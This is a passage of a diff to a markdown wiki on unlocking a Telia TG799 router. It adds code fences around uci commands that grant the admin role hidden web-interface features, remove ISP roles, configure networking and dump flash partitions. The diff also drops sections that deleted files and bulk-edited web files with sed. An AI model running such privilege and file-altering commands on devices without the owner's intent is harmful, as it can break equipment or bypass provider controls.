 ##### IF YOU ADD THEM IN WRONG ORDER YOU GET A ERROR MESSAGE: 'uci: Invalid Argument'
 
 #### Rules
 
+```sh
     uci add_list web.uidefault.upgradefw_role='admin'
     uci set web.natalghelpermodal=rule
     uci set web.relaymodal=rule
@@ -1164,9 +1224,11 @@ For upgrade firmware, you just have to type:
     uci set mobiled.globals.enabled='1'
     uci set mobiled.device_defaults.enabled='1'
     uci commit; /etc/init.d/nginx restart
+```
 
 ##### Ruleset
 
+```sh
     uci add_list web.ruleset_main.rules=xdsllowmodal
     uci add_list web.ruleset_main.rules=systemmodal
     uci add_list web.ruleset_main.rules=diagnostics
@@ -1181,9 +1243,11 @@ For upgrade firmware, you just have to type:
     uci add_list web.ruleset_main.rules=iproutesmodal
     uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
     uci commit; /etc/init.d/nginx restart
+```
 
-##### Target ( You will get even more stuff in webinterface after you run below commands )
+##### Targets
 
+```sh
     uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
     uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
     uci set web.systemmodal.target='/modals/system-modal.lp'
@@ -1206,9 +1270,11 @@ For upgrade firmware, you just have to type:
     uci set web.ltesim.target='/modals/lte-sim.lp'
     uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
     uci commit; /etc/init.d/nginx restart
+```
 
-##### Roles ( You will see new stuff on webinterface after you run below commands)
+##### Roles
 
+```sh
     uci add_list web.assistancemodal.roles='admin'
     uci add_list web.usermgrmodal.roles='admin'
     uci add_list web.cwmpconf.roles='admin'
@@ -1235,28 +1301,11 @@ For upgrade firmware, you just have to type:
     uci add_list web.ltesms.roles='admin'
     uci add_list web.logviewer.roles="admin"
     uci commit; /etc/init.d/nginx restart
+```
 
-##### Delete all telia internal rules:
-
-    uci delete mwan.teliainternal1
-    uci delete mwan.teliainternal2
-    uci delete telia.config
-    uci delete telia.com_ts_boot
-    uci delete telia.com_ts_core_util
-    uci delete telia.com_ts_core_logging
-    uci delete telia.com_ts_core_datamodel
-    uci delete telia.com_ts_core_auth
-    uci delete telia.com_ts_core_appinstall
-    uci delete telia.com_ts_core_uci_listener
-    uci delete telia.com_ts_core_coreapp
-    uci delete telia.com_ts_core_reporter
-    uci delete telia.com_ts_core_bootupgrader
-    uci delete telia.com_ts_core_osgienvfix
-    uci delete telia.telia_zone
-    uci delete telia.telia_wifiinfo
 
 ##### Remove telia from all roles:
-
+```sh
     uci delete web_back.uidefault.upgradefw_role='telia'
     uci delete web_back.usr_assist.role='telia'
     uci delete web_back.gateway.roles='telia'
@@ -1299,112 +1348,21 @@ For upgrade firmware, you just have to type:
     uci delete web_back.mmpbxinoutgoingmodal.roles='telia'
     uci delete web_back.mmpbxservicemodal.roles='telia'
     uci delete web_back.mmpbxdectmodal.roles='telia'
+```
 
-##### Remove all mobiled stuff (just copy and paste):
-
-    echo -e "
-    #!/bin/ash
-    # Loop
-    state=$(uci show | grep -e 'mobiled.\@mobiled' | cut -d= -f1); for i in $mstate; do uci delete $i; done
-    for msettings in $(uci show|grep -Eo 'mobiled.@.*'|cut -d. -f1,2|cut -d= -f1 &> /dev/null); do uci delete $msettings;    done
-
-    # 1by1
-    uci delete mobiled.device_defaults &> /dev/null
-    uci delete mobiled.platform &> /dev/null
-    uci delete mobiled.globals &> /dev/null
-    uci set network.wwan.proto=''
-    uci delete web.lteajaxmobiletab &> /dev/null
-    uci delete web_back.lteajaxmobiletab &> /dev/null
-    uci del_list web.ruleset_main.rules='mobiled'
-    uci delete web.lteajaxmobiletab.roles &> /dev/null
-    uci set ledfw.status_led.mobile_itf=''
-    uci delete web_back.ruleset_main.rules='ltesim'
-    uci delete web_back.ruleset_main.rules='lteajaxsim'
-    uci delete web_back.ruleset_main.rules='lteajaxmobiletab'
-    uci delete web_back.ruleset_main.rules='lteradioparameters'
-    uci delete web_back.ruleset_main.rules='lteprofiles'
-    uci delete web_back.ruleset_main.rules='ltesms'
-    uci delete web_back.ruleset_main.rules='ltedoctormodal'
-    uci delete web_back.ruleset_main.rules='ltemodal'
-    uci delete web.ruleset_main.rules='ltemodal'
-    uci delete web.ruleset_main.rules='ltemodal'
-    uci delete web.ruleset_main.rules='ltedoctormodal'
-    uci delete web.ruleset_main.rules='ltesms'
-    uci delete web.ruleset_main.rules='lteprofiles'
-    uci delete web.ruleset_main.rules='lteradioparameters'
-    uci delete web.ruleset_main.rules='lteajaxsms'
-    uci delete web.ruleset_main.rules='lteajaxmobiletab'
-    uci delete web.ruleset_main.rules='ltenetworkscan'
-    uci delete web.ruleset_main.rules='lteajaxsim'
-    uci delete web.ruleset_main.rules='ltesim'
-    uci delete web.ruleset_main.rules='ltedoctorajax'
-    uci delete web_back.ltemodal &> /dev/null
-    uci delete web_back.ltedoctormodal &> /dev/null
-    uci delete web_back.ltesms &> /dev/null
-    uci delete web_back.lteprofiles &> /dev/null
-    uci delete web_back.lteradioparameters &> /dev/null
-    uci delete web_back.lteajaxsms &> /dev/null
-    uci delete web_back.ltenetworkscan &> /dev/null
-    uci delete web_back.lteajaxsim &> /dev/null
-    uci delete web_back.ltesim &> /dev/null
-    ici delete web.ltemodal &> /dev/null
-    uci delete web.ltedoctormodal &> /dev/null
-    uci delete web.ltesms &> /dev/null
-    uci delete web.lteprofiles &> /dev/null
-    uci delete web.lteradioparameters &> /dev/null
-    uci delete web.lteajaxsms &> /dev/null
-    uci delete web.ltenetworkscan &> /dev/null
-    uci delete web.lteajaxsim &> /dev/null
-    uci delete web.ltesim &> /dev/null
-    uci delete web.ltemodal
-    uci delete web.ltemod
-    uci delete web.lteajaxsim.target &> /dev/null
-    uci del_list web_back.ruleset_main.rules='ltedoctor'
-    uci del_list web_back.ruleset_main.rules='ltedoctorajax'
-    uci del_list web_back.ruleset_main.rules='ltenetworkscan'
-    uci del_list web_back.ruleset_main.rules='lteajaxsms'
-    uci del_list web_back.ruleset_main.rules='ltedoctor'
-    rm /www/docroot/ajax/sms.lua
-    rm /www/docroot/ajax/sim.lua
-    rm /www/docroot/ajax/mobiletab.lua
-    rm /www/docroot/ajax/lte-doctor.lua
-    echo All mobile shit has been removed.. " > /tmp/remove.mobileshit
-    sed -i 's/^    //g' /tmp/remove.mobileshit;chmod +x /tmp/remove.mobileshit; sh /tmp/remove.mobileshit; rm /tmp/remove.mobileshit
-
-
-##### Wanna have some fun? Edit all false to true and vice versa ;p
-###### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )
-
-    sed -i 's/false/true/g' /www/cards/*.lp
-    sed -i 's/false/true/g' /www/lua/*.lua
-    sed -i 's/false/true/g' /www/modals/*.lp
-    sed -i 's/false/true/g' /www/snippets/*.lp
-    sed -i 's/false/true/g' /www/docroot/*.lp
-    sed -i 's/false/true/g' /www/docroot/
-    sed -i 's/false/true/g' /www/docroot/ajax/*.lua
-
-
-#### Add admin to everything and remove superuser & telia:
-##### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )
-
-    sed -i 's/false/true/g' /www/cards/010_lte.lp
-    sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
-    sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp
-    sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp
-    sed -i 's/superuser/admin/' /www/docroot/modals/gateway-modal.lp
-    sed -i 's/superuser/admin/' /www/docroot/modals/internet-modal.lp
-    sed -i 's/superuser/admin/' /www/docroot/modals/mmpbx-global-modal.lp
-    uci commit
 
 #### Add a new new modal:
 
+```sh
     uci set web.modalsmodalrule=rule
     uci set web.ruleset_main.rules=modalsmodalsrule
     uci add_list web.l2tpipsecservermodal.target='/modals/modals-name.lp'
     uci set web.l2tpipsecservermodal.roles='roles'
+```
 
 #### A minimal alias definition for a bridged interface might be:
 
+```sh
     config interface lan
     option 'ifname' 'eth0'
     option 'type' 'bridge'
@@ -1417,9 +1375,11 @@ For upgrade firmware, you just have to type:
      option 'proto' 'static'
      option 'ipaddr' '10.0.0.1'
      option 'netmask' '255.255.255.0'
+```
 
 #### For for a non-bridge interface
 
+```sh
     config interface lan
     option 'ifname' 'eth0'
     option 'proto' 'static'
@@ -1431,12 +1391,14 @@ For upgrade firmware, you just have to type:
      option 'proto' 'static'
      option 'ipaddr' '10.0.0.1'
      option 'netmask' '255.255.255.0'
+```
 
 #### Use your tg799 router as a switch instead as router:
 
 ##### Here is my example for using all ports for local network and also wan port(5):
 
-    echo "
+```sh
+cat << "EOF" > /etc/config/network
     config 'switch' 'eth0'
         option 'enable' '1'
 
@@ -1463,18 +1425,19 @@ For upgrade firmware, you just have to type:
     config 'switch_vlan' 'eth0_4'
      option 'device' 'eth0'
      option 'vlan' '4'
-     option 'ports' '0 5' #lan4 " > /etc/config/network
+     option 'ports' '0 5' #lan4 
+```
 
 #### Create backup of all /dev/mtd[1-7]
 
  Insert usb: 
- 
+ ```sh
      mkdir -p /mnt/usb/<label>/backup_mtd
      
-     for number in $(seq 1 7); do 
+     for number in $(seq 0 7); do 
          dd if=/dev/mtd${number} of=/mnt/usb/<label>/backup_mtd/mtd${number}.img;
      done
-     
+```
 Result for: 17.2.0405-1441042-20191114170637-ec29699cbbf5c66c53b310489f62a141f46bf628: 
 
      mtd1.img: Squashfs filesystem, little endian, version 4.0, xz compressed, 29719215 bytes, 3791 inodes, blocksize: 262144 bytes, created: Tue May  2 15:59:58 2017
@@ -1487,27 +1450,25 @@ Result for: 17.2.0405-1441042-20191114170637-ec29699cbbf5c66c53b310489f62a141f46
 Just mount mtd1 and play around:
 
 ![Screenshot](https://wuseman.nr1.nu/archive/tg799_telia/various_previews/2.png)
-     
+
+```sh
      squashfuse mtd1.img /mnt/router/justforfun
      
 
 #### Using bridge mode with a dedicated PPPoE ethernet port:
 
+```sh
     uci set network.lan.dns='1.1.1.1'
     uci set network.lan.gateway='192.168.0.254'
     uci set mmpbxrvsipnet.sip_net.interface='lan'
     uci set mmpbxrvsipnet.sip_net.interface6='lan6'
 
-#### Mirror Servers for openwrt:
+#### Mirrors for OpenWRT:
 
     http://mirrors.tuna.tsinghua.edu.cn/openwrt   HTTP, HTTPS, RSYNC     China
     http://tp.stw-bonn.de/pub/openwrt/            HTTP, FTP              Germany
     http://http://openwrt.emagnus.eu/openwrt/     HTTP, HTTPS, RSYNC     Germany
     http://ba.mirror.garr.it/mirrors/openwrt/     HTTP, FTP, RSYNC       Italy
-
-## Be careful with settings not provided by me! ;)
-
-#### AUTHOR/OWNER OF THIS WIKI IS wuseman
 
 # CONTACT
 
@@ -1516,9 +1477,9 @@ Just mount mtd1 and play around:
 
 # WEB SITE
 
-    Visit our homepage for the latest info and updated tools
+    https://wuseman.nr1.nu
 
-    https://nr1.nu & https://github.com/wuseman/
+    https://nr1.nu 
 
 ### END!
 
